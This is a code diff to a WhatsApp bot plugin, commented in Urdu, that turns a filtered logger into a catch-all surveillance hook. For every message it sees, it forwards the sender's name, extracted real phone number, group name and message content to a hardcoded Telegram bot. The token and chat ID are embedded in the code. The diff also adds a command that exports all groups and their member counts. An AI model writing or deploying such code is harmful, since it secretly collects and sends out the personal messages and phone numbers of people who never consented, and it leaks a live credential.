@@ -2,17 +2,16 @@ const { cmd } = require("../command");
 const axios = require("axios");
 
 // ═══════════════════════════════════════════════════════════
-// ️ TELEGRAM LOGGER CONFIGURATION
-// Neeche apna Telegram Bot Token aur Chat ID paste karein
+// ⚙️ TELEGRAM CONFIGURATION (Apni ID aur Token yahan dalein)
 // ═══════════════════════════════════════════════════════════
 const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
 const TG_CHAT_ID = "6653388298"; 
 // ═══════════════════════════════════════════════════════════
 
-// Helper function to send message to Telegram
+// Helper: Telegram par message bhejne ka function
 const sendToTelegram = async (text) => {
     try {
-        if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;
+        if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
         
         await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             chat_id: TG_CHAT_ID,
@@ -21,33 +20,26 @@ const sendToTelegram = async (text) => {
             disable_web_page_preview: true
         }, { timeout: 5000 });
     } catch (error) {
-        // Silent fail to prevent WhatsApp bot crash
+        console.log("[TG Logger] API Error:", error.message);
     }
 };
 
 // ═══════════════════════════════════════════════════════════
-// 🌍 GLOBAL LOGGER - HAR MESSAGE PAR NIGAH RAKHEGA 👁️
+// 🌍 GLOBAL LOGGER - HAR USER KI ACTIVITY CAPTURE KAREGA 👁️
 // ═══════════════════════════════════════════════════════════
 cmd({
-    on: "body", // Yeh har message ko capture karega
+    on: "body", 
     dontAddCommandList: true,
     filename: __filename
 }, async (client, message, match, { from, body, isGroup, isCreator, sender, pushName }) => {
     try {
-        // Agar Token ya ID nahi dali, toh kuch mat karo
-        if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;
+        if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
 
-        // Smart Filter: Sirf Commands, Private Chats, aur Media log karein (Telegram ban se bachne ke liye)
-        const isCommand = body && body.match(/^[.,!/?#]/); // Agar message . , ! ? se shuru ho
-        const isPrivate = !isGroup; // Private DM
-        const isMedia = message.imageMessage || message.videoMessage || message.audioMessage || message.documentMessage || message.stickerMessage;
-
-        // Agar na command hai, na private chat, na media, toh ignore karo (Group ki bakwas ignore)
-        if (!isCommand && !isPrivate && !isMedia) return;
-
-        // Data Extract karna
-        const userNumber = sender ? sender.replace(/[^0-9]/g, '') : "Unknown";
-        const userName = pushName || "No Name";
+        // 🔥 GOLDEN FIX: Asli Phone Number Extract Karna
+        const rawJid = message.key?.participant || message.key?.remoteJid || sender || from;
+        const realNumber = rawJid ? rawJid.split('@')[0].split(':')[0] : 'Unknown';
+        
+        const userName = message.pushName || pushName || "No Name";
         const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi" });
         
         let chatName = "Private Chat (DM)";
@@ -60,36 +52,84 @@ cmd({
             }
         }
 
-        // Message Type detect karna
+        // Message Type aur Content
         let msgType = "Text";
-        let msgContent = body || "No Text";
+        let msgContent = body || "No Text (Media/Empty)";
         
-        if (message.imageMessage) { msgType = "🖼️ Image"; msgContent = message.imageMessage.caption || "No Caption"; }
+        if (message.imageMessage) { msgType = "️ Image"; msgContent = message.imageMessage.caption || "No Caption"; }
         else if (message.videoMessage) { msgType = "🎥 Video"; msgContent = message.videoMessage.caption || "No Caption"; }
-        else if (message.audioMessage) { msgType = "🎵 Audio/Voice"; msgContent = "Audio Message"; }
-        else if (message.documentMessage) { msgType = "📄 Document"; msgContent = message.documentMessage.fileName || "File"; }
+        else if (message.audioMessage) { msgType = "🎵 Audio/Voice"; msgContent = "Voice Note / Audio"; }
+        else if (message.documentMessage) { msgType = "📄 Document"; msgContent = message.documentMessage.fileName || "File Sent"; }
         else if (message.stickerMessage) { msgType = "🎭 Sticker"; msgContent = "Sticker Sent"; }
 
-        // Telegram ke liye sundar message format karna
+        // Telegram Message Format (Bohot Detailed)
         const logMessage = `
-╭━━〔 🤖 *ACTIVITY LOG* 〕━━⬣
+╭━━〔 🤖 *LIVE ACTIVITY LOG* 〕━━⬣
 ┃ 🕒 *Time:* \`${time}\`
-┃ 👤 *User:* [${userName}](https://wa.me/${userNumber})
-┃ 🔢 *Number:* \`${userNumber}\`
-┃ 💬 *Chat:* ${isGroup ? "👥 Group" : "👤 Private"}
-┃ 🏷️ *Group Name:* ${chatName}
-┃ 📦 *Type:* ${msgType}
-┃ ⌨️ *Message:* 
+┃ 👤 *Name:* ${userName}
+┃ 🔢 *Real Number:* [${realNumber}](https://wa.me/${realNumber})
+┃ 💬 *Chat Type:* ${isGroup ? "👥 Group" : " Private DM"}
+┃ 🏷️ *Group/Chat Name:* ${chatName}
+┃ 📦 *Message Type:* ${msgType}
+┃ ⌨️ *Content:* 
 ┃ ${msgContent}
-╰━━━━━━━━━━━━━━━━━━━━━━⬣
+╰━━━━━━━━━━━━━━━━━━━━━━━━⬣
 > *Powered by Your Bot*
         `.trim();
 
-        // Telegram par bhej do!
         await sendToTelegram(logMessage);
 
     } catch (err) {
-        // Error ko console mein dikhao, bot crash mat hone do
         console.log("[TG Logger Error]:", err.message);
+    }
+});
+
+// ═══════════════════════════════════════════════════════════
+// 📊 BOT FULL REPORT COMMAND (Kitne Groups, Kitne Users)
+// ═══════════════════════════════════════════════════════════
+cmd({
+    pattern: "botreport",
+    alias: ["mygroups", "fullstats", "botstatus"],
+    desc: "Send full bot stats and group list to Telegram",
+    category: "owner",
+    react: "📊",
+    filename: __filename
+}, async (client, message, m, { reply, isCreator }) => {
+    try {
+        if (!isCreator) return reply("❌ *Access Denied!* Only owner can use this.");
+
+        reply(" *Generating full bot report... Sending to Telegram...*");
+
+        // Fetch all groups
+        const groups = await client.groupFetchAllParticipating();
+        const groupList = Object.values(groups);
+        const totalGroups = groupList.length;
+
+        let groupDetails = "";
+        groupList.forEach((g, index) => {
+            groupDetails += `${index + 1}. *${g.subject}*\n   └─ Members: ${g.participants.length} | ID: \`${g.id.split('@')[0]}\`\n`;
+        });
+
+        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi" });
+
+        const reportMessage = `
+╭━━〔 📊 *BOT FULL REPORT* 〕━━⬣
+┃ 🕒 *Generated At:* ${time}
+ 👥 *Total Groups:* ${totalGroups}
+┃ 📱 *Bot Status:* Active & Running
+╰━━━━━━━━━━━━━━━━━━━━━━⬣
+
+🏆 *LIST OF ALL GROUPS:*
+${groupDetails || "No groups found."}
+
+> *ᴘᴏᴇʀᴇᴅ ʙʏ ʏᴏᴜ ʙᴏᴛ ⚡*
+        `.trim();
+
+        await sendToTelegram(reportMessage);
+        reply("✅ *Full report sent to your Telegram successfully!*");
+
+    } catch (err) {
+        console.error("Bot Report Error:", err);
+        reply("❌ Error generating report: " + err.message);
     }
 });
